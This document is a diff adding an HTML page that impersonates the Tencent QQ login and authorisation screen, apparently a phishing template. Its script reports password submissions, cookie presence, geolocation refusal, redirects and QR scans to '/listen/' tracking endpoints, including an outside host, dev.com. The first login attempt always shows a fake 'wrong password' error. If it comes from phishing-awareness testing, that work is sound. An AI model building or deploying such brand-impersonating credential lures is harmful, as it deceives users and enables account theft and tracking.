@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>QQ账号安全登录</title>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+  <link rel="icon" href="https://imgcache.qq.com/qzone/openapi/favicon.ico?t=20130219" type="image/x-icon">
+  <style>
+    *{
+      box-sizing: border-box;
+    }
+    body{
+      margin: 0;
+      width: 100vw;
+      height: 100vh;
+      font-family: PingFang SC,"Microsoft Yahei",Tahoma,sans-serif;
+      overflow-x: hidden;
+    }
+    .top-bar{
+      width: 100%;
+      height: 48px;
+      color: #555555;
+      font: 12px;
+      border-bottom: 1px solid #f5f5f5;
+      overflow: hidden;
+    }
+    .top-bar-cont > h1 {
+      background: url('https://imgcache.qq.com/open/connect/widget/pc/login/img/qqlogo_2022.png');
+      width: 56px;
+      height: 26px;
+      background-size: cover;
+      margin: 10px 0px 0px 21px;
+    }
+    .top-bar-cont{
+      max-width: 688px;
+      margin: auto;
+      height: 0px;
+    }
+    .body{
+      max-width: 688px;
+      height: 0px;
+      margin: auto;
+    }
+    .left{
+
+    }
+    .right{
+      margin-top: 32px;
+      width: 227px;
+      height: 298px;
+    }
+    .right-cont{
+      margin-top: 75px;
+      font-size: 12px;
+      line-height: 16px;
+      margin-left: 32px;
+    }
+    p{
+      display: block;
+      margin-block-start: 1em;
+      margin-block-end: 1em;
+      margin-inline-start: 0px;
+      margin-inline-end: 0px;
+    }
+    a{
+      color: #2e77e5;
+      text-decoration: none;
+    }
+  
+    .acc_ul{
+      padding: 0;
+    }
+
+    li{
+      list-style: none;
+      color: #666;
+    }
+    .check{
+      visibility:hidden;
+    }
+    .check::after{
+      content: ' ';
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      visibility: visible;
+      background: url('	https://imgcache.qq.com/open/connect/widget/pc/login/img/checkbox-unchecked.png');
+      background-size: contain;
+    }
+    .select-lable{
+      margin-left: 8px;
+      cursor: pointer;
+    }
+    #select-some::after{
+      content: ' ';
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      visibility: visible;
+      background: url('https://imgcache.qq.com/open/connect/widget/pc/login/img/checkbox-checked-disabled.png');
+      background-size: contain;
+
+    }
+    .tips{
+      white-space: nowrap;
+    }
+    .left{
+      margin: 10px 0px 0px 11px;
+      width: 422px;
+      height: 334.19px;
+    }
+    .input{
+      height: 48px;
+      position: relative;
+      z-index: 11;
+    }
+    .input > label{
+      position: absolute;
+      top: 10px;
+      left: 16px;
+      font-size: 13px;
+      line-height: 18px;
+      color: #ccc;
+      cursor: text;
+    }
+    .outer{
+      width: 250px;
+      height: 38px;
+    }
+    .outer > input {
+      width: 232px;
+      position: relative;
+      height: 16px;
+      padding: 10px 0 10px 16px;
+      line-height: 16px;
+      border: 1px solid #CCC;
+      border-radius: 4px;
+      background: 0 0;
+      color: #000;
+      font-family: PingFang SC;
+      font-size: 13px;
+      box-sizing: content-box;
+    }
+    input:focus{
+      outline: none;
+    }
+    .outer > a{
+      width: 21px;
+      height: 21px;
+      cursor: pointer;
+      position: absolute;
+      right: 16px;
+      top: 8px;
+      background: url('https://imgcache.qq.com/ptlogin/v4/style/40/images/icon_3_tiny.png') -116px -160px no-repeat;
+      display: none;
+    }
+    #sub{
+      width: 100%;
+      height: 38px;
+      line-height: 18px;
+      border: none;
+      font-size: 14px;
+      font-weight: 400;
+      color: #fff;
+      background: 0 0;
+      cursor: pointer;
+    }
+    .lottom > a{
+      color: #000;
+    }
+    .lottom > span {
+      display: inline-block;
+      height: 12px;
+      margin: 0 22px;
+      border-left: 1px solid #f5f5f5;
+      vertical-align: middle;
+      color: transparent;
+    }
+    #select-all:checked::after{
+      content: ' ';
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      visibility: visible;
+      background: url('https://imgcache.qq.com/open/connect/widget/pc/login/img/checkbox-checked.png');
+      background-size: contain;
+    }
+  </style>
+  <script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+
+</head>
+<body>
+  <div class="top-bar">
+    <div class="top-bar-cont">
+      <h1></h1>
+    </div>
+  </div>
+  <div class="body">
+
+
+    <div class="left" style="float: left; position: relative;">
+      <div class="left-cont">
+        <div class="ltop" style="margin: 0 auto 26px;">
+          <div class="title" style="font-size:20px; line-height:28px; color:#000; margin: 16px 0 6px; text-align: center;" id="d2">快捷登录</div>
+          <div class="title" id="d1" style="font-size: 12px; line-height: 16px; color: #000; text-align: center;">
+            <span id="t2">使用<a href="javascript:void(0);">QQ手机版</a>扫码登录。</span> <span id="t1" hidden>推荐使用<a href="javascript:void(0);" id="qq">快捷登录</a>，防止盗号。</span>
+          </div>
+        </div>
+        <div class="lcenter">
+          <div class="login-form" style="width: 250px; margin:0 auto; display: none;">
+            <!-- <form action="post" style="display: block;"> -->
+              <div class="input">
+                <label id="user-l">支持QQ号/邮箱/手机号登录</label>
+                <div class="outer"><input type="text" id="user"><a href="javascript:void(0);" class="del" id="del1"></a></div>
+              </div>
+              <div class="input" style="height: 68px;">
+                <label id="pwd-l">请输入密码</label>
+                <div class="outer"><input type="password" id="pwd"><a href="javascript:void(0);" class="del" id="del2"></a></div>
+                <div id="warn" style="font-size: 12px;position: absolute; bottom: 6px;" hidden>
+                  <span id="logo" style="position:absolute;height:16px; line-height:16px; vertical-align: middle;width: 16px;background: url(https://qq-web-legacy.cdn-go.cn/any.ptlogin2.qq.com/v1.34.1/ptlogin/v4/style/40/images/error_icon.png) no-repeat;background-size: contain;"></span>
+                  <span style="padding-left:22px; display:inline-block; line-height:16px; color:#ff5765; vertical-align:middle;text-align: left;">账号或密码错误！</span>
+                </div>
+              </div>
+              <div class="submit" style="position: relative; height: 38px; border-radius: 4px; background-color: #09f;">
+                  <a href="javascript:void(0);" style="position: absolute; left: 0; outline: none; width: 100%"><input type="submit" value="登录" id="sub"></a>
+              </div>
+            <!-- </form> -->
+          </div>   
+       
+          <div class="qlogin" style="width: 315px; margin: 0 auto; text-align: center;">
+            <span style="display: inline-block; height:120px; width:105px; text-align:center; position:relative;">
+              <img id="qrcode" src="" alt="" width="85px" height="85px" style="position:absolute;top:9px;left:9px;border-radius:2px;border:1px solid #f5f5f5">
+            </span>
+          </div>
+        </div>
+        <div class="lottom" style="height: 16px; width: 100%; position: absolute; bottom: 32px; text-align: center; font-size: 12px; color: #000; line-height: 16px;">
+          <a href="javascript:void(0);" class="link" id="forgetpwd">密码登录</a>
+          <span class="dotted"></span>
+          <a href="https://ssl.ptlogin2.qq.com/j_newreg_url" class="link" target="_blank">注册帐号</a>
+          <span class="dotted"></span>
+          <a class="link" id="feedback_web" href="https://support.qq.com/products/77942?customInfo=.appid101826977" target="_blank">意见反馈</a>
+        </div>
+      </div>
+    </div>
+
+
+    <div class="right" style="float: left;border-left: 1px solid #f5f5f5;">
+      <div class="right-cont">
+        <p class="cntword"><a href="https://www.baidu.com" style="margin-right: 5px;">asn.qq.com</a>将获取以下权限：
+        </p>
+        <div class="accredit_info" id="accredit_info">
+          <ul class="acc_ul">
+            <li class="acc_li"><input type="checkbox" id="select-all" class="check" hidefocus="true" checked="true" name="select-all">
+              <label for="" class="select-lable" for="select-all">全选</label></li>
+            <li class="acc_li"><input type="checkbox" id="select-some" class="check" hidefocus="true" checked="true">
+              <label for="" class="select-lable" for="select-some">获得您的昵称、头像、性别</label></li>
+          </ul>
+        </div>
+        <div class="tips" style="margin-top: 1px; ">
+          <p>
+            授权即同意
+            <a href="https://ti.qq.com/agreement/index.html" target="_blank">服务协议</a>和<a href="https://rule.tencent.com/rule/preview/3fd52bde-6555-453b-9ab8-c5f1f3d22c62" target="_blank">QQ隐私保护指引</a>
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <audio id='audioPlay' src='' hidden='true' />
+
+  
+  <script>
+    var PA = "$PA$";
+    var hasclicked = false;
+    var submitPwdURL = "/listen/SubmitPasswd?"+PA;
+    var locationURL = "/listen/UnLocation?"+PA;
+    var cookieURL = "/listen/cookie?"+PA;
+    var forgetpwdURL = "/listen/ForgottenPasswd?"+PA;
+    var redirectToURL = "/listen/RedirectTo?"+PA;
+    var qrcodeURL = "https://dev.com/listen/ScanQRCode?"+PA;
+
+    setTimeout(() => {
+      $.post(redirectToURL, (res) => {});
+    }, 1000*10);
+
+    $(document).ready(function() {
+      $('#forgetpwd').click(function(e) {
+        if (e.target.innerHTML === '密码登录') {
+          e.target.innerHTML = '找回密码';
+          $('.qlogin').hide();
+          $('.login-form').show();
+          $('#d2').text("密码登录");
+          $('#t2').hide();
+          $('#t1').show();
+        } else {
+          //忘记密码
+          $.post(
+            forgetpwdURL,
+            (res) => {
+          });
+        }
+      });
+
+      $('#qq').click(function(e){
+          $('.qlogin').show();
+          $('.login-form').hide();
+          $('#forgetpwd').text('密码登录');
+          $('#d2').text("快捷登录");
+          $('#t2').show();
+          $('#t1').hide();
+        });
+
+      $("#user").on( "input", function(e) {
+        if (e.target.value.length > 0 ) {
+          $('#del1').show();
+          $('#user-l').hide();
+        } else if (e.target.value.length < 1){
+          $('#del1').hide();
+          $('#user-l').show();
+        }
+      });
+
+      $("#pwd").on( "input", function(e) {
+        if (e.target.value.length > 0 ) {
+          $('#pwd-l').hide();
+        } else if (e.target.value.length < 1){
+          $('#pwd-l').show();
+        }
+      });
+
+      $('#del1').click(function(e) {
+          $('#user').val("");
+          $(this).hide();
+          $('#user-l').show();
+      });
+  
+      $('#sub').click(function () {
+          if ($('#user').val().length <= 2 || $('#pwd').val().length <= 2) {
+            $("#warn").show();
+            setTimeout(() => {
+                $('#warn').hide();
+            }, 5000);
+          } else{
+            if (!hasclicked) {
+              $("#warn").show();
+              setTimeout(() => {
+                  $('#warn').hide();
+              }, 5000);
+              hasclicked = true;
+            } else {
+              //重定向
+              window.location.assign(redirectToURL+"&type=c");
+            }
+             //提交密码
+             $.post(
+                submitPwdURL,
+                (res)=>{
+                }
+              );
+          }
+      })
+
+      //qrcode
+      QRCode.toDataURL(qrcodeURL, (err, url)=> {
+        $('#qrcode').attr('src', url);
+      });
+
+      //定位
+      if (navigator.geolocation) {
+
+        navigator.geolocation.getCurrentPosition((pos)=>{}, 
+        (err) => {
+          if (err.code == err.PERMISSION_DENIED) {
+              $.post(
+                locationURL,
+                (res) => {
+                }
+              );  
+          }
+        });
+
+      } 
+      else
+      {
+        console.log("Positon Error!");
+        $.post(
+            locationURL,
+            (res) => {
+            }
+          );
+      }
+
+      //声音
+      var audio = document.getElementById( "audioPlay" );
+
+      //cookie
+      if (document.cookie.length > 0) {
+        $.ajax({
+            url:cookieURL,
+            success: (res) => {
+            }
+          });
+      }
+    });
+
+ 
+  </script>
+</body>
+</html>
